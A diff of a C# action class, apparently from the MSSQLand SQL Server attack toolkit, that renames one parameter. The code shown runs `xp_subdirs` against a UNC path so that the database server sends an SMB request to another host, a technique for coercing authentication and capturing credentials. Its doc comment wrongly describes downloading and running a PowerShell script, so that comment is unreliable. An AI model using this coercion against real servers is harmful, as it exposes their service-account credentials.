@@ -44,14 +44,14 @@ namespace MSSQLand.Actions.Network
         /// <summary>
         /// Executes the PowerShell command to download and run the script from the provided URL.
         /// </summary>
-        /// <param name="connectionManager">The ConnectionManager instance to execute the query.</param>
-        public override void Execute(DatabaseContext connectionManager)
+        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
+        public override void Execute(DatabaseContext databaseContext)
         {
             Logger.TaskNested($"Sending SMB request to: {_uncPath}");
 
             string query = $"exec xp_subdirs '{_uncPath}';";
 
-            var response = connectionManager.QueryService.ExecuteScalar(query);
+            var response = databaseContext.QueryService.ExecuteScalar(query);
             if (response != null)
             {
                 Console.WriteLine(response);
